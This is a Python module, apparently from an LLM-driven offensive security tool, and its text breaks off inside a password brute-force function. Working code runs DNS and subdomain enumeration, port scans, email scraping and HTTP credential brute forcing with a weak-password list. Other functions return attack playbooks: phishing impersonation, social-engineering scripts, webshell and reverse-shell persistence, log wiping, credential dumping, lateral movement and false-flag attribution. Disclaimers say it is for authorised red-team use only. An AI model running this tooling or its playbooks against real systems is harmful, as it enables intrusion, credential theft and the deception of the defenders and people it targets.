from __future__ import annotations

import socket
import urllib.request
from typing import Any

from .pentest_tools import COMMON_PORTS, SERVICE_PROBES

WARNING_TEXT = (
    "注意：此模式仅用于授权的红蓝对抗/安全研究。\n"
    "未经授权使用属于违法行为，后果自负。\n"
)


# Windows GBK safe print
def safe_print(text: str, **kwargs: Any) -> None:
    try:
        print(text, **kwargs)
    except UnicodeEncodeError:
        print(text.encode("gbk", errors="replace").decode("gbk"), **kwargs)



# ── RECON 阶段 ──────────────────────────────────────────

def osint_recon(target: str, **kwargs: Any) -> dict[str, Any]:
    """OSINT 信息收集：真实 DNS 解析 + 常见子域名探测"""
    result: dict[str, Any] = {
        "target": target,
        "ip": "",
        "domain_info": {},
        "subdomains": [],
        "findings": [],
    }
    try:
        ip = socket.gethostbyname(target)
        result["ip"] = ip
        result["domain_info"] = {"hostname": target, "ip": ip}
        result["findings"].append(f"目标 IP: {ip}")

        # 真实 DNS 解析常见子域名 — 只返回能解析到的
        for sub in ["www", "mail", "vpn", "oa", "git", "portal", "admin", "api", "dev", "sso",
                     "smtp", "pop", "ftp", "test", "staging", "wiki", "jira", "confluence"]:
            hostname = f"{sub}.{target}"
            try:
                sub_ip = socket.gethostbyname(hostname)
                result["subdomains"].append({"host": hostname, "ip": sub_ip})
            except socket.gaierror:
                pass

        if result["subdomains"]:
            result["findings"].append(
                f"解析到 {len(result['subdomains'])} 个子域名: "
                + ", ".join(s["host"] for s in result["subdomains"])
            )
        else:
            result["findings"].append("常见子域名均无法解析，目标未暴露内部系统域名")
    except socket.gaierror:
        result["findings"] = [f"域名 {target} 无法解析 (DNS 不可达)"]
    return result


def osint_tech_recon(target: str, **kwargs: Any) -> dict[str, Any]:
    """技术栈识别：通过 HTTP 响应头识别 Web 框架、WAF、CDN"""
    result: dict[str, Any] = {
        "target": target,
        "detected_techs": [],
        "waf_type": "未知",
        "cdn": "未知",
        "versions": {},
        "known_vulns": [],
        "findings": [],
    }
    try:
        req = urllib.request.Request(f"http://{target}", method="HEAD")
        with urllib.request.urlopen(req, timeout=10) as resp:
            headers = dict(resp.headers)
            techs = []
            server = headers.get("Server", "")
            if server:
                techs.append(server)
                result["versions"]["server"] = server
            x_powered = headers.get("X-Powered-By", "")
            if x_powered:
                techs.append(x_powered)
                result["versions"]["x_powered_by"] = x_powered
            result["detected_techs"] = techs
            result["waf_type"] = _detect_waf(headers)
            result["cdn"] = _detect_cdn(headers)
    except Exception:
        result["findings"] = [f"无法连接 {target}:80，目标可能未开放 HTTP 服务"]
        return result

    if result["detected_techs"]:
        result["findings"].append(f"检测到技术栈: {', '.join(result['detected_techs'])}")
    if result["waf_type"] != "未知":
        result["findings"].append(f"检测到 WAF: {result['waf_type']}")
    return result


def osint_social_recon(target: str, **kwargs: Any) -> dict[str, Any]:
    """社工信息收集：尝试从 Web 页面提取组织/人员信息"""
    result: dict[str, Any] = {
        "target": target,
        "organization": "",
        "department_structure": [],
        "key_personnel": [],
        "email_format": f"*@{target}" if "." in target else "",
        "social_accounts": [],
        "findings": [],
    }

    # 尝试访问目标网站提取组织信息
    try:
        import urllib.request as _ur
        req = _ur.Request(f"http://{target}", headers={"User-Agent": "Mozilla/5.0"}, method="GET")
        with _ur.urlopen(req, timeout=8) as _resp:
            html = _resp.read().decode("utf-8", errors="replace")[:10000]

        import re as _re

        # 提取 title
        _m = _re.search(r"<title[^>]*>(.*?)</title>", html, _re.I | _re.S)
        if _m:
            _title = _m.group(1).strip()
            result["organization"] = _title
            result["findings"].append(f"网站标题: {_title}")

        # 提取邮箱
        _emails = set(_re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", html))
        for _e in sorted(_emails):
            if not _e.endswith(f".{target.split('.')[-1]}"):
                continue
            result["social_accounts"].append({"type": "email", "value": _e})

        if result["social_accounts"]:
            result["findings"].append(f"发现 {len(result['social_accounts'])} 个邮箱地址")

        # 检查 robots.txt 获取隐藏路径情报
        try:
            _robots_req = _ur.Request(f"http://{target}/robots.txt", method="GET")
            with _ur.urlopen(_robots_req, timeout=5) as _rob:
                _robots = _rob.read().decode("utf-8", errors="replace")[:2000]
                _disallowed = _re.findall(r"Disallow:\s*(/\S*)", _robots)
                if _disallowed:
                    result["findings"].append(f"robots.txt 发现 {len(_disallowed)} 个受限路径")
        except Exception:
            pass

    except Exception as _exc:
        result["findings"].append(f"无法访问目标网站: {_exc}")

    if not result["organization"]:
        result["findings"].append("未从公开页面提取到组织信息，建议手动收集（官网/招聘/企查查等）")

    return result


# ── SOCIAL_ENG 阶段 ─────────────────────────────────────

def se_phishing_gen(context: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
    """生成钓鱼邮件模板（仅用于授权红蓝对抗，禁止用于非法社工）"""
    target = context.get("target", "")
    org = context.get("organization", "") or target
    leader = context.get("leader_name", "")
    role = context.get("role", "")
    vector = context.get("vector", "firewall_breach")

    # 基于真实上下文生成模板结构，具体话术由 LLM 根据实际情报填充
    templates = []
    if vector == "phishing" and leader:
        templates.append({
            "scenario": f"冒充 {leader} 发送紧急通知",
            "target_audience": "全体教职工",
            "suggested_theme": "安全检查 / 绩效考核 / 系统升级",
            "notes": f"发件人应伪造为 {leader}@{target}，需事先获取目标单位邮件网关策略",
        })
    if org:
        templates.append({
            "scenario": f"冒充 {org} IT/运维部门",
            "target_audience": "内部员工",
            "suggested_theme": "密码过期 / VPN 升级 / 安全培训",
            "notes": "需了解目标单位实际使用的 IT 系统名称和通知格式",
        })
    templates.append({
        "scenario": "鱼叉附件投递",
        "target_audience": "特定部门/岗位",
        "suggested_theme": "会议通知 / 工资明细 / 合同文件",
        "notes": "附件类型应与目标单位日常工作流匹配，避免引起怀疑",
    })

    return {
        "target": target,
        "vector": vector,
        "templates": templates,
        "disclaimer": "以上为攻击场景建议，具体邮件话术需由 LLM 根据真实情报生成。仅用于授权红蓝对抗。",
        "findings": [
            f"基于目标 {target} 规划 {len(templates)} 种钓鱼攻击场景",
            "实际话术应根据真实情报（组织架构、OA系统名称、内部通知风格）定制",
            "未经授权对他人实施社工钓鱼属于违法行为",
        ],
    }


def se_conversation_gen(context: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
    """生成社工话术框架（电话/IM 场景，仅用于授权红蓝对抗）"""
    target = context.get("target", "")
    org = context.get("organization", "") or target

    return {
        "target": target,
        "framework": {
            "steps": [
                "身份铺垫 — 使用真实存在的部门名称/人员姓名建立可信度",
                "建立信任 — 引用目标单位内部术语、近期事件或已知项目",
                "索取信息/权限 — 将请求包装为日常工作流程的一部分",
                "消除疑虑 — 提供表面合理的回退方案或验证途径",
                "收尾 — 自然结束对话，留下正面印象减少事后怀疑",
            ],
            "key_principles": [
                "话术必须基于真实的 OSINT 情报，不能凭空编造内部信息",
                "伪装身份应选对方不易验证的角色（外包商/上级单位/监管机构）",
                "避免过度索取敏感信息，一次只获取一项，降低对方警觉",
            ],
        },
        "common_scenarios": [
            {
                "role": "IT 运维/技术支持",
                "pretext": "系统升级/密码重置/VPN 配置",
                "info_target": "账号密码/VPN 配置/远程接入权限",
            },
            {
                "role": "外包商/供应商",
                "pretext": "设备巡检/合同续签/账单核对",
                "info_target": "内网接入权限/内部联系人/系统清单",
            },
            {
                "role": "上级/监管单位",
                "pretext": "安全检查/紧急通知/合规要求",
                "info_target": "内部文件/账号密码/组织架构",
            },
        ],
        "disclaimer": "以上为社工攻击方法论。具体话术需由 LLM 根据真实情报生成。仅用于授权红蓝对抗。",
        "findings": [
            "提供 3 种社工场景框架和五步话术模型",
            "实际话术效果取决于情报准确度和执行者经验",
            "未经授权对他人实施社工攻击属于违法行为",
        ],
    }


# ── INITIAL_ACCESS 阶段 ─────────────────────────────────

def apt_boundary_scan(target: str, **kwargs: Any) -> dict[str, Any]:
    """边界综合探测：真实 TCP 端口扫描 + 服务识别 + VPN/邮件网关检测"""
    result: dict[str, Any] = {
        "target": target,
        "open_ports": [],
        "services": [],
        "web_info": {},
        "vpn_detected": False,
        "mail_gateway": False,
        "findings": [],
    }
    try:
        ip = socket.gethostbyname(target)
        open_ports = []

        def _scan_one(p: int) -> int | None:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            try:
                if sock.connect_ex((ip, p)) == 0:
                    return p
            except Exception:
                pass
            finally:
                sock.close()
            return None

        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=50) as _exec:
            _futs = {_exec.submit(_scan_one, p): p for p in COMMON_PORTS[:50]}
            for _f in as_completed(_futs):
                _r = _f.result()
                if _r is not None:
                    open_ports.append({"port": _r, "state": "open"})
        result["open_ports"] = open_ports
        result["open_count"] = len(open_ports)

        services = []
        for entry in open_ports[:20]:
            port = entry["port"]
            banner = _probe_banner(ip, port)
            service = _guess_service(banner, port)
            services.append({"port": port, "service": service, "banner": banner})
        result["services"] = services

        result["vpn_detected"] = any(
            s["service"] in ("openvpn", "pptp", "ipsec", "ssl_vpn", "fortinet")
            for s in services
        )
        result["mail_gateway"] = any(
            s["service"] in ("smtp", "pop3", "imap", "exchange")
            for s in services
        )

        # 防火墙设备检测
        result["firewall_info"] = _detect_firewall(services, open_ports, ip)

        if result["firewall_info"].get("detected"):
            result["findings"].append(
                f"检测到防火墙设备: {result['firewall_info'].get('brand', '未知品牌')} "
                f"(管理口: {', '.join(result['firewall_info'].get('mgmt_ports', []))})"
            )
        if result["vpn_detected"]:
            result["findings"].append("检测到 VPN 服务，是边界突破的潜在入口")
        if result["mail_gateway"]:
            result["findings"].append("检测到邮件网关，可利用钓鱼攻击")
        if open_ports:
            ports_str = ", ".join(str(p["port"]) for p in open_ports[:10])
            result["findings"].append(f"开放端口 ({len(open_ports)}个): {ports_str}")
        else:
            result["findings"].append("未发现开放端口，目标可能在内网或防火墙全拦截")

    except socket.gaierror:
        result["findings"] = [f"域名 {target} 无法解析"]
    return result


def apt_exploit_plan(scan_results: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
    """突破方案规划：基于真实扫描结果制定突破路径"""
    target = scan_results.get("target", "unknown")
    entry_points: list[dict[str, Any]] = []

    if scan_results.get("vpn_detected"):
        entry_points.append({
            "method": "VPN 漏洞利用 / 弱口令爆破",
            "target": target,
            "difficulty": "中",
            "success_probability": "40%",
            "details": "尝试 VPN 常见弱口令或已知 CVE",
        })
    if scan_results.get("mail_gateway"):
        entry_points.append({
            "method": "钓鱼邮件 + 附件投递",
            "target": target,
            "difficulty": "中低",
            "success_probability": "60%",
            "details": "结合社工信息发送定向钓鱼邮件",
        })
    _raw_ports = scan_results.get("open_ports", [])
    web_ports = [p for p in _raw_ports if (p if isinstance(p, int) else p.get("port", 0) if isinstance(p, dict) else 0) in (80, 443, 8080, 8443)]
    if web_ports:
        entry_points.append({
            "method": "Web 应用漏洞利用",
            "target": target,
            "difficulty": "中",
            "success_probability": "35%",
            "details": "检测 Web 应用是否存在 SQL 注入 / 未授权访问",
        })
    entry_points.append({
        "method": "社工攻击获取凭证",
        "target": target,
        "difficulty": "中",
        "success_probability": "45%",
        "details": "通过电话/邮件社工获取内部人员账号口令",
    })

    return {
        "target": target,
        "entry_points": entry_points,
        "recommended_path": entry_points[0]["method"] if entry_points else "无可用入口",
        "findings": [
            f"规划 {len(entry_points)} 条突破路径",
            f"推荐路径: {entry_points[0]['method'] if entry_points else '无'}",
            "建议多条路径并行，提高成功率",
        ],
    }


# ── PERSISTENCE 阶段 ────────────────────────────────────

def apt_persistence_plan(target_info: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
    """持久化方案：WebShell、定时任务、注册表、隧道等策略"""
    target = target_info.get("target", "unknown")
    return {
        "target": target,
        "persistence_methods": [
            {
                "method": "WebShell",
                "platform": "Linux / Windows (IIS)",
                "description": "上传 WebShell 到 Web 服务器，通过 HTTP 维持控制",
                "stealth_level": "中",
                "detection_risk": "文件落地会被 EDR 检测",
            },
            {
                "method": "定时任务反弹 Shell",
                "platform": "Linux (cron)",
                "description": "写入 crontab，每 5 分钟反向连接 C2",
                "stealth_level": "中高",
                "detection_risk": "异常定时任务可能被堡垒机发现",
            },
            {
                "method": "注册表启动项",
                "platform": "Windows",
                "description": "写入 Run/RunOnce 键值，开机启动",
                "stealth_level": "低",
                "detection_risk": "容易被安全软件查杀",
            },
            {
                "method": "SOCKS5 隧道",
                "platform": "全平台",
                "description": "建立 SOCKS5 隧道，将内网流量代理到外网 C2",
                "stealth_level": "高",
                "detection_risk": "隧道流量特征可能被 NTA 检测",
            },
        ],
        "c2_channels": [
            {"type": "HTTPS 反向连接", "frequency": "每 5 分钟", "obfuscation": "TLS 加密 + 魔改 HTTP 头"},
            {"type": "DNS 隧道", "frequency": "持续", "obfuscation": "DNS A 记录编码"},
        ],
        "findings": [
            "提供 4 种持久化方案",
            "推荐 SOCKS5 隧道 + HTTPS 反向连接组合",
            "所有操作需配合日志清理",
        ],
    }


def apt_log_clean(target_info: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
    """日志清理策略：按系统类型规划日志清理方案"""
    target = target_info.get("target", "unknown")
    return {
        "target": target,
        "log_paths": {
            "linux": [
                "/var/log/auth.log",
                "/var/log/syslog",
                "/var/log/messages",
                "/var/log/secure",
                "/var/log/httpd/",
                "~/.bash_history",
            ],
            "windows": [
                "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
                "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
                "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
                "IIS 日志 (C:\\inetpub\\logs\\LogFiles\\)",
            ],
        },
        "clean_methods": [
            {
                "target_os": "Linux",
                "method": "使用 shred 覆写删除日志文件",
                "effectiveness": "高",
                "risk": "可能触发文件完整性监控 (AIDE/Tripwire)",
            },
            {
                "target_os": "Linux",
                "method": "仅删除包含关键 IP 的日志行",
                "effectiveness": "中",
                "risk": "遗漏痕迹",
            },
            {
                "target_os": "Windows",
                "method": "使用 wevtutil 清除 Security 日志",
                "effectiveness": "高",
                "risk": "日志清空会触发告警",
            },
            {
                "target_os": "Windows",
                "method": "停止 EventLog 服务后替换 evtx 文件",
                "effectiveness": "中高",
                "risk": "服务停止会被监控系统发现",
            },
        ],
        "covering_tracks": [
            "清理 ~/.bash_history 或 PowerShell 历史",
            "删除上传的工具文件",
            "恢复被修改的配置文件时间戳",
            "清除 ARP 缓存中的扫描痕迹",
        ],
        "findings": [
            f"识别 {target} 的关键日志路径",
            "提供分系统、分级别的日志清理方案",
            "建议：清理前后对比日志大小，避免全清引起怀疑",
        ],
    }


# ── LATERAL 阶段 ────────────────────────────────────────

def apt_lateral_plan(state: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
    """横向移动路径规划 — 基于已有发现提供方法论，不虚构内网拓扑"""
    target = state.get("target", "unknown")
    compromised_hosts = state.get("compromised_hosts", [])
    access_level = state.get("access_level", "unknown")

    return {
        "target": target,
        "current_position": {
            "compromised_hosts": compromised_hosts or [target],
            "access_level": access_level,
        },
        "methodology": [
            {
                "phase": "内网存活探测",
                "techniques": ["ARP 扫描", "ICMP Ping Sweep", "TCP SYN 扫描 (常见内网端口)"],
                "tools": ["arp-scan", "nmap -sn", "nbtscan"],
                "notes": "需在已控主机上执行，探测结果取决于实际网络环境",
            },
            {
                "phase": "凭证收集",
                "techniques": [
                    "读取 ~/.ssh/authorized_keys 和 known_hosts",
                    "搜索配置文件中的明文密码 (web.config, .env, application.properties)",
                    "从内存转储凭据 (mimikatz / lsass dump)",
                    "Kerberoasting — 请求域内 SPN 服务票据",
                    "浏览器保存的密码和会话 Cookie",
                ],
                "notes": "仅在授权测试范围内收集，实际可用凭证取决于目标环境",
            },
            {
                "phase": "横向移动",
                "techniques": [
                    "Pass-the-Hash / Pass-the-Ticket (Windows 域环境)",
                    "SSH 密钥复用 (Linux 环境)",
                    "RDP / VNC 远程桌面",
                    "WMI / WinRM 远程命令执行",
                    "PsExec / SMBExec",
                    "数据库链接服务器跳转 (SQL Server Linked Server)",
                ],
                "notes": "实际可用横向路径需在获得初始立足点后动态探测",
            },
        ],
        "credential_targets": [
            {"type": "域控制器 (AD)", "why": "获取域管权限后可控制所有域内主机"},
            {"type": "SSH 私钥", "why": "SSH Agent Forwarding 可能导致密钥在多台主机间传播"},
            {"type": "数据库连接字符串", "why": "应用配置文件中常含数据库和管理后台凭据"},
            {"type": "CI/CD 系统凭证", "why": "Jenkins/GitLab CI 中常存储多环境部署密钥"},
        ],
        "findings": [
            "无法获取目标真实内网拓扑，需在获得立足点后动态探测",
            f"当前已控: {len(compromised_hosts or [target])} 台主机",
            "横向移动的实际路径完全取决于目标网络架构和已控主机权限",
            "建议按「存活探测 → 凭证收集 → 横向移动」顺序推进",
        ],
    }


def apt_privilege_plan(state: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
    """权限提升方案：内核漏洞、SUDO、服务权限、域 ACL 等路径"""
    target = state.get("target", "unknown")
    return {
        "target": target,
        "current_level": "[需在实际环境中通过 whoami / id 确定]",
        "target_level": "[取决于测试目标 — 域管理员 / root / DBA]",
        "methods": [
            {
                "os": "Linux",
                "technique": "SUDO 配置审计 (sudo -l; find / -perm -4000 -type f 2>/dev/null)",
                "category": "配置错误",
                "detection_risk": "低（合法运维命令）",
            },
            {
                "os": "Linux",
                "technique": "内核漏洞本地提权 — 需根据 uname -r 匹配已公开 CVE",
                "category": "漏洞利用",
                "detection_risk": "中（可能触发内核防护模块）",
            },
            {
                "os": "Windows",
                "technique": "服务权限配置错误 (Unquoted Service Path / 服务 ACL 可写)",
                "category": "配置错误",
                "detection_risk": "中（可能触发 EDR 行为监控）",
            },
            {
                "os": "Windows",
                "technique": "Kerberoasting / AS-REP Roasting — 从域控获取可破解的服务票据",
                "category": "凭证攻击",
                "detection_risk": "中低（正常 Kerberos 流量）",
            },
            {
                "os": "Windows",
                "technique": "令牌窃取 / 进程注入 (SeImpersonate 权限利用)",
                "category": "权限滥用",
                "detection_risk": "中高（EDR 常监控进程注入行为）",
            },
        ],
        "findings": [
            "实际提权路径需根据目标系统版本、补丁级别和配置决定",
            "建议先用自动化工具 (LinPEAS / WinPEAS) 收集本地信息",
            "优先尝试配置错误类提权，成功率高于 0day",
        ],
    }


# ── CROSS_TARGET 阶段 ───────────────────────────────────

def apt_cross_plan(state: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
    """跨目标攻击规划：利用已控跳板攻击下游目标，支持 multi-hop"""
    primary = state.get("target", "unknown")
    apt_targets = state.get("apt_targets", [])
    via_target = state.get("via_target", "")

    # 找出所有未控的下游目标
    uncompromised = [t for t in apt_targets if not t.get("compromised") and t.get("host") != primary]
    # 找出已控目标作为可用跳板
    springboards = [t for t in apt_targets if t.get("compromised")]

    cross_routes = []
    for s in springboards:
        for u in uncompromised:
            cross_routes.append({
                "from": f"已控制的 {s.get('host', s.get('id'))}",
                "to": u.get("host", u.get("id")),
                "method": "通过已控设备的 VPN/防火墙隧道进入对方内网",
                "trust_leveraged": "内网互信 / VPN 专线 / 供应商通道",
                "decoy": f"同时在 {s.get('host')} 制造扫描噪音作为诱饵",
            })

    return {
        "primary_target": primary,
        "via_target": via_target,
        "springboards": [{"id": s.get("id"), "host": s.get("host")} for s in springboards],
        "cross_attack_routes": cross_routes,
        "trust_relationships": [
            f"{primary} 与下游目标之间存在 VPN 互连/专线",
            "可能使用相同 AD 域或统一身份认证平台",
            "供应商运维通道 / 共享文件服务器",
        ],
        "decoy_plans": [
            {
                "action": f"在跳板目标发起大量端口扫描",
                "purpose": "让蓝队认为攻击者仍在跳板活动",
            },
            {
                "action": "留下虚假的攻击者画像（模拟俄语/英语攻击者特征）",
                "purpose": "干扰溯源和归因",
            },
            {
                "action": "篡改日志时间戳，制造攻击时间线偏差",
                "purpose": "混淆攻击路径还原",
            },
        ],
        "next_hop_targets": [u.get("host") for u in uncompromised],
        "findings": [
            f"规划 {len(cross_routes)} 条跨目标攻击路线" if cross_routes else "无未控目标，跳过跨目标攻击",
            "利用信任关系作为跳板比直接边界突破更隐蔽",
            f"已控 {len(springboards)} 个跳板，可攻击 {len(uncompromised)} 个下游目标",
            "声东击西策略可有效干扰蓝队溯源",
        ],
    }


def apt_evasion_plan(state: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
    """绕过与对抗方案：流量加密、分时段、白签名、内存执行"""
    awareness = state.get("blue_team_awareness", 30)
    target = state.get("target", "unknown")
    return {
        "target": target,
        "current_blue_team_awareness": awareness,
        "evasion_methods": [
            {
                "technique": "流量加密混淆",
                "description": "使用 HTTPS + 自定义 TLS 指纹进行 C2 通信",
                "effectiveness": "高",
            },
            {
                "technique": "分时段低频操作",
                "description": "避开工作时间（9:00-18:00），在深夜/周末执行敏感操作",
                "effectiveness": "高",
            },
            {
                "technique": "白签名利用",
                "description": "使用被信任的签名二进制 (LOLBins) 执行命令",
                "effectiveness": "中高",
            },
            {
                "technique": "内存执行无文件落地",
                "description": "通过 PowerShell 远程加载，不在磁盘留下文件",
                "effectiveness": "高",
            },
        ],
        "timing_strategy": {
            "recon": "全天候（被动收集不受限）",
            "exploit": "凌晨 02:00-05:00",
            "lateral": "周末",
            "exfiltrate": "混入业务高峰期流量中",
        },
        "alert_triggers": [
            "大量 422/403 响应 → 可能触发 WAF 告警",
            "多次登录失败 → 可能触发账号锁定策略",
            "外连陌生 IP → 可能触发 NTA 告警",
        ],
        "findings": [
            f"当前蓝队感知度: {awareness}/100",
            "推荐内存执行 + HTTPS 隧道组合",
            "严格分时段操作，降低关联分析可能性",
        ],
    }


# ── REPORT 阶段 ─────────────────────────────────────────

def web_user_agent_brute(target: str, port: int = 80, **kwargs: Any) -> dict[str, Any]:
    """遍历单个字母 User-Agent 探测 Web 服务是否存在基于 UA 的访问控制

    发送 A-Z 共 26 个单字母 User-Agent 到目标 Web 服务，
    对比各 UA 返回的状态码、正文长度和内容，识别异常响应（特殊的认证提示、警告信息等）。
    特别适用于 CTF / 渗透场景中基于 Agent ID 或 User-Agent 的访问控制机制。

    总执行时间上限 30s，超时中断。
    """
    import urllib.request as _ur
    import re as _re
    import time as _tm

    https = kwargs.get("https", False)
    path = kwargs.get("path", "/")
    timeout = kwargs.get("timeout", 2)  # 每个请求 2s 超时
    scheme = "https" if https else "http"
    url = f"{scheme}://{target}:{port}{path}"

    result: dict[str, Any] = {
        "target": target,
        "port": port,
        "url": url,
        "results": [],
        "anomalies": [],
        "findings": [],
    }

    # 先拿基准响应（普通浏览器 UA）
    try:
        _ref_req = _ur.Request(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
        with _ur.urlopen(_ref_req, timeout=timeout) as _resp:
            _ref_body = _resp.read()
            _ref_len = len(_ref_body)
            _ref_status = _resp.status
    except Exception:
        _ref_len = 0
        _ref_status = 0

    _start = _tm.monotonic()
    for _letter in [chr(ord('A') + i) for i in range(26)]:
        if _tm.monotonic() - _start > 30:  # 总执行时间上限 30s
            result["summary"] = f"总执行时间超 30s，已中断（已完成 {_letter}）"
            break
        try:
            _req = _ur.Request(url, headers={"User-Agent": _letter}, method="GET")
            with _ur.urlopen(_req, timeout=timeout) as _resp:
                _body = _resp.read()
                _body_str = _body.decode("utf-8", errors="replace")[:500]
                _entry = {
                    "agent": _letter,
                    "status": _resp.status,
                    "body_length": len(_body),
                    "body_preview": _body_str[:200],
                    "anomaly": False,
                }
                # 与基准响应对比检测异常
                if _resp.status != _ref_status or abs(len(_body) - _ref_len) > 100:
                    _entry["anomaly"] = True
                    result["anomalies"].append(_entry)
                    result["findings"].append(
                        f"User-Agent '{_letter}' 返回异常: status={_resp.status}, "
                        f"body_len={len(_body)} (基准: {_ref_status}/{_ref_len})"
                    )
                result["results"].append(_entry)
        except _ur.HTTPError as _exc:
            _body_str = _exc.read().decode("utf-8", errors="replace")[:200] if _exc.fp else ""
            _entry = {
                "agent": _letter,
                "status": _exc.code,
                "body_length": len(_body_str),
                "body_preview": _body_str[:200],
                "anomaly": _exc.code not in (200, 301, 302, 404),
            }
            if _entry["anomaly"]:
                result["anomalies"].append(_entry)
            result["results"].append(_entry)
        except Exception as _exc:
            result["results"].append({"agent": _letter, "error": str(_exc)[:100]})

    result["anomaly_count"] = len(result["anomalies"])
    if result["anomalies"]:
        _agent_ids = [a["agent"] for a in result["anomalies"]]
        result["summary"] = (
            f"发现 {result['anomaly_count']} 个异常 User-Agent: {', '.join(_agent_ids)}。"
            f"目标存在基于 User-Agent 的访问控制机制。"
        )
    else:
        result["summary"] = "未发现基于 User-Agent 的访问控制异常"

    return result


def web_codename_brute(
    target: str,
    port: int = 80,
    *,
    wordlist: list[str] | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """使用自定义 codename 字典作为 User-Agent 批量探测 Web 认证机制

    与 web_user_agent_brute（固定 A-Z 单字母）不同，本工具接受任意 codename 列表，
    适用于已知部分 codename（如 'chris'）后，进一步枚举更多有效身份。
    自动检测哪些 codename 返回了不同的页面内容。

    总执行时间上限 30s，超时中断。
    """
    import urllib.request as _ur
    import ssl as _ssl
    import time as _tm

    https = kwargs.get("https", False)
    path = kwargs.get("path", "/")
    timeout = kwargs.get("timeout", 2)  # 每个请求 2s 超时
    scheme = "https" if https else "http"
    url = f"{scheme}://{target}:{port}{path}"

    # 默认字典：单字母 A-Z + 已知/常见 codename
    if not wordlist:
        wordlist = [chr(ord('A') + i) for i in range(26)] + [
            "chris", "agent", "admin", "root", "guest", "user",
            "staff", "employee", "manager", "admin", "operator",
            "test", "dev", "api", "service", "backup",
            "monitor", "audit", "support", "help", "info",
            "security", "network", "system", "mail", "vpn",
        ]

    result: dict[str, Any] = {
        "target": target,
        "port": port,
        "url": url,
        "wordlist_size": len(wordlist),
        "results": [],
        "valid_codenames": [],
        "findings": [],
    }

    # 基准请求
    try:
        _ref_req = _ur.Request(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
        if https:
            _ctx = _ssl._create_unverified_context()
            _ref_resp = _ur.urlopen(_ref_req, context=_ctx, timeout=timeout)
        else:
            _ref_resp = _ur.urlopen(_ref_req, timeout=timeout)
        _ref_body = _ref_resp.read()
        _ref_len = len(_ref_body)
        _ref_status = _ref_resp.status
    except Exception as _exc:
        return {**result, "error": f"基准请求失败: {_exc}"}

    _start = _tm.monotonic()
    for _codename in wordlist:
        if _tm.monotonic() - _start > 30:  # 总执行时间上限 30s
            result["summary"] = f"总执行时间超 30s，已中断（已完成 {len(result['results'])}/{len(wordlist)}）"
            break
        _entry: dict[str, Any] = {"codename": _codename}
        try:
            _req = _ur.Request(url, headers={"User-Agent": _codename}, method="GET")
            if https:
                _resp = _ur.urlopen(_req, context=_ctx, timeout=timeout)
            else:
                _resp = _ur.urlopen(_req, timeout=timeout)
            _body = _resp.read()
            _body_str = _body.decode("utf-8", errors="replace")[:300]
            _entry["status"] = _resp.status
            _entry["body_length"] = len(_body)
            _entry["body_preview"] = _body_str
            # 判断是否有效：状态码或正文与基准显著不同
            is_valid = (
                _resp.status != _ref_status
                or abs(len(_body) - _ref_len) > 50
            )
            _entry["valid"] = is_valid
            if is_valid:
                result["valid_codenames"].append(_codename)
                result["findings"].append(
                    f"codename '{_codename}': status={_resp.status}, "
                    f"body_len={len(_body)} (基准: {_ref_status}/{_ref_len})"
                )
        except _ur.HTTPError as _exc:
            _body_str = _exc.read().decode("utf-8", errors="replace")[:200] if _exc.fp else ""
            _entry["status"] = _exc.code
            _entry["body_preview"] = _body_str
            _entry["valid"] = _exc.code not in (200, 301, 302, 404, 403)
            if _entry["valid"]:
                result["valid_codenames"].append(_codename)
        except Exception as _exc:
            _entry["error"] = str(_exc)[:100]
        result["results"].append(_entry)

    result["valid_count"] = len(result["valid_codenames"])
    if result["valid_codenames"]:
        result["summary"] = (
            f"发现 {result['valid_count']} 个有效 codename: {', '.join(result['valid_codenames'][:10])}"
        )
    else:
        result["summary"] = "未发现有效 codename"

    return result


def web_login_brute(
    host: str,
    port: int = 80,
    *,
    usernames: list[str] | None = None,
    passwords: list[str] | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """对 Web 登录表单/HTTP Basic Auth 执行定向密码爆破

    与 apt_credential_attack（侧重于 SSH/FTP/SMB）不同，本工具专门针对 Web 认证：
    1. 尝试 HTTP Basic Auth（Authorization: Basic）
    2. 尝试表单登录（POST username=xxx&password=xxx）
    3. 使用 User-Agent 头携带 codename 尝试基于 UA 的认证

    适用于已知有效用户名后，批量测试弱口令。
    """
    import urllib.request as _ur
    import ssl as _ssl
    import base64 as _b64

    https = kwargs.get("https", False)
    login_path = kwargs.get("login_path", "/login")
    timeout = kwargs.get("timeout", 2)
    scheme = "https" if https else "http"

    # 默认密码字典
    if not passwords:
        passwords = [
            "admin", "123456", "password", "admin123", "root",
            "test", "guest", "1234", "12345", "12345678",
            "qwerty", "letmein", "welcome", "monkey", "sunshine",
            "passw0rd", "P@ssw0rd", "changeme", "secret", "weak",
            "chris", "agent", "default", "temp", "temp123",
        ]
    if not usernames:
        usernames = ["admin", "chris", "root", "guest", "user", "test"]

    url = f"{scheme}://{host}:{port}/"
    login_url = f"{scheme}://{host}:{port}{login_path}"

    result: dict[str, Any] = {
        "target": host,
        "port": port,
        "attempts": 0,
        "basic_auth_results": [],
        "form_auth_results": [],
        "ua_auth_results": [],
        "successes": [],
        "findings": [],
    }

    # ── 1. HTTP Basic Auth 爆破 ──
    for u in usernames:
        for p in passwords:
            _token = _b64.b64encode(f"{u}:{p}".encode()).decode()
            _req = _ur.Request(url, headers={"Authorization": f"Basic {_token}"})
            try:
                _resp = _ur.urlopen(_req, timeout=timeout)
                if _resp.status == 200:
                    result["successes"].append({
                        "method": "basic_auth",
                        "username": u, "password": p,
                        "status": _resp.status,
                        "url": url,
                    })
